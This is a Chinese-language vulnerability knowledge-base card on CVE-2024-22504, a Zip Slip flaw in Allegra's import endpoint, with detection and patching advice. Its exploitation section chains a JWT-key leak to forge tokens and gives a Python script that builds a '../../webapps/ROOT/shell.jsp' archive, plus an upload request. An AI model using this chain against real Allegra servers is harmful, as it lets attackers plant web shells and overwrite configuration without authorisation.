---
id: web-java-component-allegra-import-allegra-format-zipslip
title: Allegra importFromAllegraFormat zipslip：ZipEntry.getName 未校验，解压穿越任意写文件（CVE-2024-22504）
type: scenario
domain: web
path: web/java/component
technique: allegra-import-allegra-format-zipslip
tags:
- java
- struts
- allegra
- trackplus
- zipslip
- archive
- path-traversal
- arbitrary-write
- cve-2024-22504
cve:
- CVE-2024-22504
affected_versions: Allegra < 7.5.1（原文明确）
severity: critical
confidence: medium
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V532
  verified_at: '2026-11-11T17:19:15+08:00'
  notes: 已对照原文13184与截图核对：正文影响版本Allegra<7.5.1明确；img01 ZDI-24-107确认CVE-2024-22504=extarctZippedFile Directory Traversal RCE(7.2)；正文Import#importFromAllegraFormat遍历ZipInputStream调用extarctZippedFile，sink为new File(unzipTempDirectory, zipEntry.getName())后FileOutputStream写入，路由/rest/v2/items/exchange/import/importFromAllegraFormat且使用JWT认证（可用CVE-2024-22507读jwt.SigningKey伪造），卡与之一致。修正：别名断词extr actZippedFile改为原文方法名extarctZippedFile，正文extractZippedFile同步标注原文拼写。原文无完整请求PoC，卡confidence medium并给示意payload，适当。dedup候选为通用zipslip/其他CMS，非同链。
url: /docs/web/java/component/web-java-component-allegra-import-allegra-format-zipslip/
draft: false
kb_aliases:
- CVE-2024-22504
- Allegra zipslip
- importFromAllegraFormat
- extarctZippedFile
- ZipEntry 路径穿越
- trackplus zip 解压
---

## 一句话结论

Allegra 的 `/rest/v2/items/exchange/import/importFromAllegraFormat` 在 `Import#importFromAllegraFormat` 中遍历 `ZipInputStream`，对每个 `ZipEntry` 直接 `new File(unzipTempDirectory, zipEntry.getName())` 并写文件，没有规范化/基目录校验；构造含 `../../` 条目名的恶意压缩包即可把文件写到解压目录之外（任意文件写入），配合 Web 目录可写入 JSP 或覆盖配置实现 RCE（CVE-2024-22504，影响 < 7.5.1）。该接口需要 JWT 认证，可用 CVE-2024-22507 读到的 `jwt.signingKey` 伪造 token。

## 原理

- **Zip Slip 经典模式**：`extarctZippedFile(unzipTempDirectory, zipInputStream, zipEntry)`（方法名按原文拼写）中 `File destFile = new File(unzipTempDirectory, zipEntry.getName())`，随后 `new FileOutputStream(destFile)` 写入。`zipEntry.getName()` 完全来自压缩包，若包含 `../`，`File` 拼接后即逃逸出 `unzipTempDirectory`；代码未调用 `getCanonicalPath()` 校验目标是否在解压目录下。
- **入口与认证**：路由 `/rest/v2/items/exchange/import/importFromAllegraFormat` 使用 JWT 认证；同系列 CVE-2024-22507 可读取 `GeneralSettings.properties` 中的 `jwt.signingKey`，攻击者据此伪造任意用户/权限的 JWT，满足认证前提。
- **危害**：任意路径写入可覆盖应用配置、模板、脚本或写入 Web 可访问目录；在 Java 容器中写入 `.jsp` 即可执行，或覆盖 `GeneralSettings.properties`/库文件导致进一步利用。原文将其归类为 Directory Traversal Remote Code Execution（ZDI-24-107，CVSS 7.2）。
- **为什么用压缩包**：导入功能本意是解压 Allegra 格式的交换包到临时目录再处理，攻击者控制压缩包内容与条目名，属于典型的“信任压缩包条目路径”缺陷。

## 触发条件

- Allegra < 7.5.1，`/rest/v2/items/exchange/import/importFromAllegraFormat` 可达。
- 攻击者持有有效 JWT（或通过 CVE-2024-22507 获取签名密钥后伪造）。
- 解压目标目录及穿越目标路径对应用进程可写。
- 压缩包能被正常解析（ZIP 格式、条目内容可控）。

## 利用步骤

1. 通过 CVE-2024-22507 读取 `GeneralSettings.properties`，取得 `jwt.signingKey`；按其算法伪造 JWT。
2. 制作恶意 ZIP：包含正常条目与一个 `../../<目标路径>/shell.jsp`（或覆盖配置文件的条目），内容为 JSP/配置内容。
3. 以 multipart 形式把 ZIP 上传到 `/rest/v2/items/exchange/import/importFromAllegraFormat`，携带伪造的 `Authorization: Bearer <jwt>`。
4. 服务端解压时按条目名写到穿越路径；访问写入的 JSP 或观察配置被覆盖。
5. 清理写入文件；如覆盖配置，按备份恢复。

## PoC

制作恶意 zip（示意）：

```python
import zipfile
with zipfile.ZipFile('evil.zip', 'w') as z:
    z.writestr('../../webapps/ROOT/shell.jsp', '<% out.print("PWNED"); %>')
    z.writestr('normal.txt', 'ok')
```

上传请求（示意，JWT 需伪造）：

```http
POST /rest/v2/items/exchange/import/importFromAllegraFormat HTTP/1.1
Host: target
Authorization: Bearer <forged-jwt>
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="file"; filename="evil.zip"
Content-Type: application/zip

<zip bytes>
------X--
```

## 变体与关联

- **条目名变体**：`../`、`..\\`（Windows）、绝对路径、多层穿越；不同容器/文件系统对分隔符处理不同，可多试。
- **同系列 CVE**：文件读取取 JWT（CVE-2024-22507，[[web-java-component-allegra-download-attachment-filename-traversal-jwt-key]]）、上传穿越（CVE-2024-22510，[[web-java-component-allegra-branding-uploadfile-path-traversal]]）、反序列化（CVE-2024-22505，[[web-java-deserialization-allegra-renderfieldmatch-listmapping]]）。
- **同类 zipslip**：[[web-java-component-kkfileview-compress-zipslip-arbitrary-write]]、[[web-generic-file-upload-ant-zipslip-leading-dotdot-prefix-bypass]]。
- **边界**：需有效 JWT；若签名密钥已轮换/配置不同，需重新获取；解压目录权限不足时写入失败。

## 检测与防御

- **检测（Web/应用）**：`importFromAllegraFormat` 上传的 ZIP 条目名含 `../`/绝对路径；解压日志出现目标目录外的文件写入；`/rest/v2/...` 使用异常 JWT（签名/用户/权限不匹配）。
- **检测（文件）**：解压目录外新增/覆盖文件；Web 目录出现 JSP；`GeneralSettings.properties` 等配置被修改。
- **防御**：升级到 7.5.1+；解压前对每个条目 `getCanonicalPath()` 校验必须位于解压目录内，拒绝 `..`/绝对路径/符号链接；限制上传包大小与条目数；JWT 密钥轮换并限制配置文件读取；应用以低权限运行，Web 目录不可由应用进程任意写。
